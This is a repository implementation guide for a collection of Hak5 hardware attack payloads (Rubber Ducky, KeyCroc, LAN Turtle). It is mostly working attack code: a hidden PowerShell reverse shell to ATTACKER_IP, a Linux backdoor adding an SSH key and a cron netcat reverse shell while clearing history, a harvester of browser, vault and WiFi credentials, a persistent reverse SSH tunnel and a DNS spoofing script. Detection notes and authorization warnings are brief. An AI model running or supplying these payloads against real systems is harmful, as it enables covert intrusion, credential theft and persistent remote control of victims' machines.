# Hak5 Arsenal - Implementation Guide

**Status:** Framework Created | **Ready for:** Content Population

This guide documents the complete structure for the Hak5 Arsenal repository.

---

## 📊 Current Status

### ✅ Complete
- Main README with comprehensive overview
- LEGAL_DISCLAIMER.md
- LICENSE (MIT)
- .gitignore
- requirements.txt
- Repository structure documented

### ⏳ Ready to Migrate/Create
- KeyCroc payloads (migrate from existing repo)
- Rubber Ducky payloads (create new)
- LAN Turtle modules (create new)
- Analysis tools (create new)
- Device-specific documentation

---

## 📁 Complete Directory Structure

```
Hak5-Arsenal/
├── README.md                          ✅ Created
├── LEGAL_DISCLAIMER.md                ✅ Created
├── DEFENSIVE_GUIDE.md                 ⏳ To Create
├── LICENSE                            ✅ Created
├── .gitignore                         ✅ Created
├── requirements.txt                   ✅ Created
├── IMPLEMENTATION_GUIDE.md            ✅ This file
│
├── keycroc/                           ⏳ Migrate from existing
│   ├── README.md
│   ├── payloads/
│   │   ├── system-recon.croc
│   │   ├── system-recon-README.md
│   │   ├── cred-exfil-on-screenlock.croc
│   │   └── example-output.txt
│   └── tools/
│       └── loot-analyzer.py
│
├── rubber-ducky/                      ⏳ To Create
│   ├── README.md
│   ├── payloads/
│   │   ├── windows/
│   │   │   ├── system-recon.txt
│   │   │   ├── reverse-shell.txt
│   │   │   ├── credential-harvester.txt
│   │   │   └── README.md
│   │   ├── linux/
│   │   │   ├── quick-recon.txt
│   │   │   ├── persistence.txt
│   │   │   └── README.md
│   │   └── macos/
│   │       ├── system-enum.txt
│   │       └── README.md
│   └── tools/
│       ├── payload-encoder.py
│       └── README.md
│
├── lan-turtle/                        ⏳ To Create
│   ├── README.md
│   ├── modules/
│   │   ├── persistent-access.sh
│   │   ├── network-recon.sh
│   │   ├── dns-spoof.sh
│   │   ├── packet-capture.sh
│   │   └── README.md
│   └── tools/
│       ├── traffic-analyzer.py
│       ├── module-manager.sh
│       └── README.md
│
└── tools/                             ⏳ To Create
    ├── unified-analyzer.py
    ├── payload-converter.py
    └── README.md
```

---

## 🐊 KeyCroc Migration Plan

### Source
Existing repository: https://github.com/CamoRageaholic1/KeyCroc

### Files to Migrate
1. **payloads/system-recon.croc**
   - System enumeration payload
   - Documentation already complete

2. **payloads/cred-exfil-on-screenlock.croc**
   - Credential harvesting payload
   - Comprehensive documentation

3. **payloads/SYSTEM_RECON_README.md**
   - Full technical documentation
   - Defensive countermeasures

4. **payloads/example-output-system-recon.txt**
   - Example output file

5. **tools/loot-analyzer.py**
   - Python analysis tool
   - Auto-parse system recon output

6. **DEFENSIVE_GUIDE.md**
   - Blue team strategies
   - Detection methods

### Migration Steps
```bash
# 1. Create keycroc directory structure
mkdir -p keycroc/payloads keycroc/tools

# 2. Copy files from old repo
cp ../KeyCroc/payloads/*.croc keycroc/payloads/
cp ../KeyCroc/payloads/*.md keycroc/payloads/
cp ../KeyCroc/payloads/*.txt keycroc/payloads/
cp ../KeyCroc/tools/*.py keycroc/tools/
cp ../KeyCroc/DEFENSIVE_GUIDE.md ./

# 3. Create keycroc/README.md (device-specific)

# 4. Update all internal links

# 5. Test loot-analyzer still works
```

---

## 🦆 Rubber Ducky Payload Specifications

### Payload 1: Windows System Recon
**File:** `rubber-ducky/payloads/windows/system-recon.txt`

**Purpose:** Quick system enumeration  
**Execution Time:** 30-60 seconds  
**Stealth:** Low

**DuckyScript Structure:**
```
REM Windows System Reconnaissance
REM Target: Windows 10/11
REM Author: David Osisek

DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden
ENTER
DELAY 1000

REM System Info
STRING $out='C:\\temp\\recon.txt';
STRING 'SYSTEM INFO' | Out-File $out;
STRING systeminfo | Out-File -Append $out;
ENTER

REM Network Config
STRING 'NETWORK CONFIG' | Out-File -Append $out;
STRING ipconfig /all | Out-File -Append $out;
ENTER

REM Running Processes
STRING 'PROCESSES' | Out-File -Append $out;
STRING Get-Process | Out-File -Append $out;
ENTER

REM Installed Software
STRING 'SOFTWARE' | Out-File -Append $out;
STRING Get-ItemProperty HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* | Out-File -Append $out;
ENTER

REM Cleanup
DELAY 2000
STRING exit
ENTER
```

**Detection:** Process creation (powershell.exe), file creation, rapid commands

---

### Payload 2: Windows Reverse Shell
**File:** `rubber-ducky/payloads/windows/reverse-shell.txt`

**Purpose:** PowerShell reverse shell  
**Execution Time:** 10-20 seconds  
**Stealth:** Medium

**DuckyScript Structure:**
```
REM PowerShell Reverse Shell
REM Replace ATTACKER_IP and PORT
REM ⚠️ AUTHORIZED TESTING ONLY

DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden -NoProfile
ENTER
DELAY 1000

STRING $c=New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',PORT);
STRING $s=$c.GetStream();
STRING [byte[]]$b=0..65535|%{0};
STRING while(($i=$s.Read($b,0,$b.Length)) -ne 0){
STRING $d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);
STRING $sb=(iex $d 2>&1 | Out-String );
STRING $sb2=$sb+'PS '+(pwd).Path+'> ';
STRING $sb=([text.encoding]::ASCII).GetBytes($sb2);
STRING $s.Write($sb,0,$sb.Length);
STRING $s.Flush()};
STRING $c.Close()
ENTER
```

**Detection:** Network connection to external IP, PowerShell execution

---

### Payload 3: Linux Quick Recon
**File:** `rubber-ducky/payloads/linux/quick-recon.txt`

**Purpose:** Fast Linux enumeration  
**Execution Time:** 20-40 seconds  
**Stealth:** Low

**DuckyScript Structure:**
```
REM Linux Quick Reconnaissance
REM Target: Ubuntu/Debian/RHEL

DELAY 1000
CTRL-ALT t
DELAY 1000

REM System Info
STRING echo '=== SYSTEM INFO ===' > /tmp/recon.txt
ENTER
STRING uname -a >> /tmp/recon.txt
ENTER
STRING cat /etc/*release >> /tmp/recon.txt
ENTER

REM Network
STRING echo '=== NETWORK ===' >> /tmp/recon.txt
ENTER
STRING ifconfig >> /tmp/recon.txt
ENTER
STRING ip a >> /tmp/recon.txt
ENTER
STRING netstat -tulpn >> /tmp/recon.txt
ENTER

REM Users
STRING echo '=== USERS ===' >> /tmp/recon.txt
ENTER
STRING cat /etc/passwd >> /tmp/recon.txt
ENTER
STRING w >> /tmp/recon.txt
ENTER

REM Cleanup
STRING exit
ENTER
```

**Detection:** Terminal launch, command execution, file creation

---

### Payload 4: Linux Persistence
**File:** `rubber-ducky/payloads/linux/persistence.txt`

**Purpose:** Install SSH backdoor  
**Execution Time:** 30-60 seconds  
**Stealth:** High

**DuckyScript Structure:**
```
REM Linux Persistence - SSH Backdoor
REM ⚠️ CRITICAL: AUTHORIZED TESTING ONLY

DELAY 1000
CTRL-ALT t
DELAY 1000

REM Add SSH key
STRING mkdir -p ~/.ssh
ENTER
STRING echo 'YOUR_SSH_PUBLIC_KEY' >> ~/.ssh/authorized_keys
ENTER
STRING chmod 700 ~/.ssh
ENTER
STRING chmod 600 ~/.ssh/authorized_keys
ENTER

REM Enable SSH if disabled
STRING sudo systemctl enable ssh
ENTER
STRING sudo systemctl start ssh
ENTER

REM Create cron backdoor
STRING (crontab -l; echo '@reboot /usr/bin/nc ATTACKER_IP PORT -e /bin/bash') | crontab -
ENTER

REM Cleanup
STRING history -c
ENTER
STRING exit
ENTER
```

**Detection:** SSH service changes, cron modifications, authorized_keys changes

---

### Payload 5: Credential Harvester
**File:** `rubber-ducky/payloads/windows/credential-harvester.txt`

**Purpose:** Extract saved credentials  
**Execution Time:** 45-90 seconds  
**Stealth:** Low

**DuckyScript Structure:**
```
REM Windows Credential Harvester
REM Extracts browser and Windows credentials

DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden
ENTER
DELAY 1000

REM Chrome Credentials
STRING $chromePath='$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Login Data';
STRING if(Test-Path $chromePath){Copy-Item $chromePath C:\\temp\\chrome_creds.db}
ENTER

REM Windows Vault
STRING vaultcmd /listcreds:'Windows Credentials' /all > C:\\temp\\vault.txt
ENTER

REM WiFi Passwords
STRING netsh wlan show profiles | Select-String 'All User Profile' | ForEach-Object{
STRING $wifi=$_.ToString().Split(':')[1].Trim();
STRING netsh wlan show profile name=$wifi key=clear
STRING } > C:\\temp\\wifi.txt
ENTER

REM Cleanup
DELAY 3000
STRING exit
ENTER
```

**Detection:** File access (browser databases), vaultcmd execution, netsh commands

---

## 🐢 LAN Turtle Module Specifications

### Module 1: Persistent SSH Access
**File:** `lan-turtle/modules/persistent-access.sh`

**Purpose:** Maintain persistent SSH backdoor  
**Detectability:** Medium

**Bash Script Structure:**
```bash
#!/bin/bash
# LAN Turtle Module: Persistent SSH Access
# Maintains reverse SSH tunnel to attacker

ATTACKER_IP="YOUR_IP_HERE"
ATTACKER_PORT="2222"
LOCAL_PORT="22"

# Start reverse SSH tunnel
autossh -M 0 -f -N -R $ATTACKER_PORT:localhost:$LOCAL_PORT \
  -o "ServerAliveInterval=60" \
  -o "ServerAliveCountMax=3" \
  -o "StrictHostKeyChecking=no" \
  root@$ATTACKER_IP

# Make persistent via cron
(crontab -l; echo "*/5 * * * * /root/persistent-access.sh") | crontab -

echo "Persistent access established"
```

**Detection:** SSH connections to external IP, cron job, network traffic

---

### Module 2: Network Reconnaissance
**File:** `lan-turtle/modules/network-recon.sh`

**Purpose:** Discover network topology and hosts  
**Detectability:** Low

**Bash Script Structure:**
```bash
#!/bin/bash
# LAN Turtle Module: Network Reconnaissance

OUTPUT="/root/loot/network-recon-$(date +%Y%m%d-%H%M%S).txt"

echo "=== NETWORK RECONNAISSANCE ===" > $OUTPUT
echo "Started: $(date)" >> $OUTPUT

# Get interface info
echo "=== INTERFACES ===" >> $OUTPUT
ifconfig >> $OUTPUT

# ARP scan
echo "=== ARP SCAN ===" >> $OUTPUT
arp-scan --localnet >> $OUTPUT

# Nmap scan
echo "=== NMAP SCAN ===" >> $OUTPUT
nmap -sn 192.168.1.0/24 >> $OUTPUT

# DNS enumeration
echo "=== DNS ===" >> $OUTPUT
cat /etc/resolv.conf >> $OUTPUT

# Routing table
echo "=== ROUTES ===" >> $OUTPUT
route -n >> $OUTPUT

echo "Reconnaissance complete: $OUTPUT"
```

**Detection:** ARP requests, network scanning, DNS queries

---

### Module 3: DNS Spoofing
**File:** `lan-turtle/modules/dns-spoof.sh`

**Purpose:** Redirect DNS queries  
**Detectability:** High

**Bash Script Structure:**
```bash
#!/bin/bash
# LAN Turtle Module: DNS Spoofing
# ⚠️ AUTHORIZED TESTING ONLY

TARGET_DOMAIN="example.com"
SPOOF_IP="192.168.1.100"

# Enable IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# Configure iptables
iptables -t nat -A PREROUTING -p udp --dport 53 -j REDIRECT --to-port 53

# Create dnsspoof config
echo "$SPOOF_IP $TARGET_DOMAIN" > /tmp/dnsspoof.conf

# Start dnsspoof
dnsspoof -i eth0 -f /tmp/dnsspoof.conf &

echo "DNS spoofing active for $TARGET_DOMAIN -> $SPOOF_IP"
```

**Detection:** Unexpected DNS responses, traffic patterns, DNS query logs

---

### Module 4: Packet Capture
**File:** `lan-turtle/modules/packet-capture.sh`

**Purpose:** Capture network traffic  
**Detectability:** Low

**Bash Script Structure:**
```bash
#!/bin/bash
# LAN Turtle Module: Packet Capture

INTERFACE="eth0"
OUTPUT_DIR="/root/loot/captures"
CAPTURE_FILE="$OUTPUT_DIR/capture-$(date +%Y%m%d-%H%M%S).pcap"

mkdir -p $OUTPUT_DIR

# Start tcpdump
tcpdump -i $INTERFACE -w $CAPTURE_FILE -s 0 &
PID=$!

echo "Packet capture started: $CAPTURE_FILE"
echo "PID: $PID"
echo "Stop with: kill $PID"

# Optional: Auto-rotate after 100MB
# tcpdump -i $INTERFACE -w $OUTPUT_DIR/capture.pcap -C 100 -W 10
```

**Detection:** Promiscuous mode, traffic analysis, large file creation

---

## 🛠️ Shared Tools Specifications

### Tool 1: Unified Analyzer
**File:** `tools/unified-analyzer.py`

**Purpose:** Analyze loot from all devices  
**Features:**
- Parse KeyCroc output
- Parse Rubber Ducky logs
- Analyze LAN Turtle captures
- Risk scoring
- JSON export

**Python Structure:**
```python
#!/usr/bin/env python3
\"\"\"
Unified Loot Analyzer for Hak5 Devices
Supports: KeyCroc, Rubber Ducky, LAN Turtle
\"\"\"

import argparse
import json
from pathlib import Path

class UnifiedAnalyzer:
    def __init__(self, device_type):
        self.device = device_type
        
    def analyze_keycroc(self, file):
        # Parse KeyCroc system recon output
        pass
        
    def analyze_ducky(self, file):
        # Parse Rubber Ducky logs
        pass
        
    def analyze_turtle(self, file):
        # Analyze LAN Turtle captures
        pass

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('-d', '--device', required=True)
    parser.add_argument('file')
    args = parser.parse_args()
    
    analyzer = UnifiedAnalyzer(args.device)
    # ... analysis logic

if __name__ == '__main__':
    main()
```

---

### Tool 2: Payload Converter
**File:** `tools/payload-converter.py`

**Purpose:** Convert payloads between formats  
**Conversions:**
- KeyCroc ↔ Rubber Ducky
- PowerShell ↔ Bash (where possible)
- Add delays for different devices

**Python Structure:**
```python
#!/usr/bin/env python3
\"\"\"
Payload Converter
Convert between KeyCroc and Rubber Ducky formats
\"\"\"

def keycroc_to_ducky(keycroc_file):
    # Convert KeyCroc payload to DuckyScript
    # Map Q commands to DUCKY commands
    pass

def ducky_to_keycroc(ducky_file):
    # Convert DuckyScript to KeyCroc format
    pass
```

---

## 📚 Device-Specific README Templates

### KeyCroc README.md
```markdown
# KeyCroc Payloads

USB keystroke injection and data exfiltration device.

## Payloads
1. System Reconnaissance
2. Credential Exfiltration on Screenlock

## Tools
- loot-analyzer.py - Automated analysis

## Usage
[SSH and payload deployment instructions]

## Detection
[Windows Event IDs, behavioral indicators]
```

### Rubber Ducky README.md
```markdown
# Rubber Ducky Payloads

HID keystroke injection with DuckyScript.

## Payloads
- Windows: System Recon, Reverse Shell, Credential Harvester
- Linux: Quick Recon, Persistence
- macOS: System Enumeration

## Tools
- payload-encoder.py - Encode DuckyScript to inject.bin

## DuckyScript Reference
[Command reference, examples]
```

### LAN Turtle README.md
```markdown
# LAN Turtle Modules

Covert network implant for MITM and persistence.

## Modules
1. Persistent Access - SSH backdoor
2. Network Recon - Discovery and mapping
3. DNS Spoof - Traffic redirection
4. Packet Capture - Traffic analysis

## Tools
- traffic-analyzer.py - PCAP analysis
- module-manager.sh - Module deployment

## Usage
[SSH, module installation, configuration]
```

---

## 🚀 Implementation Priority

### Phase 1: Foundation (Complete)
- ✅ Main README
- ✅ Legal Disclaimer
- ✅ LICENSE
- ✅ requirements.txt
- ✅ .gitignore

### Phase 2: KeyCroc Migration
1. Copy all files from existing KeyCroc repo
2. Organize in keycroc/ directory
3. Create device README
4. Update internal links

### Phase 3: Rubber Ducky
1. Create directory structure
2. Add Windows payloads (3)
3. Add Linux payloads (2)
4. Create device README
5. Add payload encoder tool

### Phase 4: LAN Turtle
1. Create directory structure
2. Add 4 modules
3. Create device README
4. Add analysis tools

### Phase 5: Shared Tools
1. Unified analyzer
2. Payload converter

### Phase 6: Documentation
1. DEFENSIVE_GUIDE.md
2. Individual payload READMEs
3. Detection guides

---

## 📝 Next Steps

### Option A: Manual Implementation
Use this guide to create files manually:
1. Create directory structure
2. Copy KeyCroc content
3. Create Rubber Ducky payloads from specifications
4. Create LAN Turtle modules from specifications
5. Implement tools

### Option B: Scripted Implementation
Create bash script to automate:
```bash
#!/bin/bash
# Populate Hak5 Arsenal

# Create directory structure
mkdir -p keycroc/{payloads,tools}
mkdir -p rubber-ducky/{payloads/{windows,linux,macos},tools}
mkdir -p lan-turtle/{modules,tools}
mkdir -p tools

# Copy/create files based on this guide
# ...
```

---

## 🎯 Testing Checklist

- [ ] All payloads have legal disclaimers
- [ ] All payloads include detection methods
- [ ] All payloads include defensive countermeasures
- [ ] Analysis tools work with sample data
- [ ] Documentation is complete and accurate
- [ ] Links are correct and functional
- [ ] Code is tested in isolated environment

---

**This guide provides the complete blueprint for the Hak5 Arsenal repository.**

**Ready to populate!** 🚀
